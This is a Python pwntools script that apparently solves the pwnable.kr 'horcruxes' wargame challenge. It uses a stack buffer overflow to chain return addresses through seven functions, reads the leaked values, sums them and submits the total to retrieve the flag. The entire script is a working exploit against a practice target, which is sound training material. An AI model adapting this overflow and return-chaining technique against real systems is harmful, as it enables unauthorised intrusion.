from pwn import *

context.update(arch='i386', os='linux')
r = remote('pwnable.kr', 9032)

A = 0x809FE4B
B = 0x809FE6A
C = 0x809FE89
D = 0x809FEA8
E = 0x809FEC7
F = 0x809FEE6
G = 0x809FF05
# This is the address of instruction call ropme in main function
# The address of ropme itself still contains bad character 0x0a
ropme = 0x0809FFFC
offset = 120

payload = b""
payload += b'A'*offset
payload += flat(
    A,B,C,D,E,F,G,ropme
)

r.recvuntil(b"Select Menu:")
r.sendline(b'1')
r.recvuntil(b"How many EXP did you earned? : ")
r.sendline(payload)
r.recvline()

A = int(r.recvlineS().strip().split('+')[1][:-1])
B = int(r.recvlineS().strip().split('+')[1][:-1])
C = int(r.recvlineS().strip().split('+')[1][:-1])
D = int(r.recvlineS().strip().split('+')[1][:-1])
E = int(r.recvlineS().strip().split('+')[1][:-1])
F = int(r.recvlineS().strip().split('+')[1][:-1])
G = int(r.recvlineS().strip().split('+')[1][:-1])
SUM = (A+B+C+D+E+F+G) & 0xFFFFFFFF #(32-bit)

r.recvuntil(b"Select Menu:")
r.sendline(b'1')
r.recvuntil(b"How many EXP did you earned? : ")
r.sendline(str(SUM))
print(r.recvlineS().strip())

r.close()